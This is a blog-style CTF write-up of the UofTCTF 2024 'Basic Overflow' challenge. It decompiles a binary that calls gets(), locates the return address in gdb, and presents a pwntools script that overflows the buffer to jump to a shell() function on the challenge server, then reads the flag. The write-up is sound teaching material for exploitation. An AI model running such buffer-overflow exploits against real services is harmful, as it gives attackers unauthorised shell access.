---
layout: post
title: "[UofTCTF 2024] Basic Overflow"
author: edaigle
---

## Problem Description
> This challenge is simple. It just gets input, stores it to a buffer. It calls gets to read input, stores the read bytes to a buffer, then exits. What is gets, you ask? Well, it's time you read the manual, no? Author: drec

This is a simple beginner pwn challenge.

## Getting started

We connect with netcat and see the program silently accepts a random input,
not too exciting.

## Decompiling

Downloading the binary and opening with Ghidra, we see it's an x64 ELF.
Ghidra finds two functions:

``` c
  undefined8 main(void) {
        char local_48[64];
        gets(local_48);
        return 0;
  }

  undefined8 shell(void) {
        execve("/bin/sh", (char.**)0x0, (char**)0x0);
        return;
  }
```

So we are reading user input into a 64-byte char array from gets().

## Analysis

As the man page warns you, gets() is dangerous: it does no overflow checking!

Clearly we need to exploit an overflow. Since the only variable here is the
input buffer, we need to overwrite the return address, making the program return
to shell() and giving us a shell.

x64 stores the return address on the stack above the saved base pointer,
parameters, and local variables. Our call to main has no parameters,
so we need to write 64 bytes to get past the input buffer, then write 8 bytes
to get past the saved rbp, then write our 8 byte address.
Disassemble main with gdb:

``` console
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401156 <+0>:     push   %rbp
   0x0000000000401157 <+1>:     mov    %rsp,%rbp
   0x000000000040115a <+4>:     sub    $0x40,%rsp
   0x000000000040115e <+8>:     lea    -0x40(%rbp),%rax
   0x0000000000401162 <+12>:    mov    %rax,%rdi
   0x0000000000401165 <+15>:    mov    $0x0,%eax
   0x000000000040116a <+20>:    call   0x401040 <gets@plt>
   0x000000000040116f <+25>:    mov    $0x0,%eax
   0x0000000000401174 <+30>:    leave
   0x0000000000401175 <+31>:    ret
End of assembler dump.
(gdb)
```

Set a breakpoint immediately after the call to gets() and inspect the frame:

``` console
(gdb) b *0x40116f
Breakpoint 1 at 0x40116f
(gdb) r
Starting program: /home/kali/ctfs/uoftctf2024/basic-overflow/basic-overflow
hi

Breakpoint 1, 0x000000000040116f in main ()
(gdb) i f
Stack level 0, frame at 0x7fffffffdd90:
 rip = 0x40116f in main; saved rip = 0x7ffff7df26ca
 Arglist at 0x7fffffffdd80, args:
 Locals at 0x7fffffffdd80, Previous frame's sp is 0x7fffffffdd90
 Saved registers:
  rbp at 0x7fffffffdd80, rip at 0x7fffffffdd88
```

So we see the return address (saved rip) is stored at 0x7fffffffdd88. This is
the location where we'll overwrite the address of the shell() function, which
Ghidra tells us is 0x401136. If we had ged, we could search for the "hi" string
we typed and confirm it is at 0x7fffffffdd88 + 72, but we'll just give it a try.

## Attack

Now we have everything we need to write our attack script:

``` python
from pwn import *

target = remote("34.123.15.202", 5000)

payload = b"0"*72
payload += p64(0x401136)

target.sendline(payload)
target.interactive()
```

Time to send it:

``` console
(kali㉿kali)-[~/ctfs/uoftctf2024/basic-overflow]
$ python exploit.py
[+] Opening connection to 34.123.15.202 on port 5000: Done
[*] Switching to interactive mode
$ ls
flag
run
$ cat flag
uoftctf{reading_manuals_is_very_fun}
```

Voila!
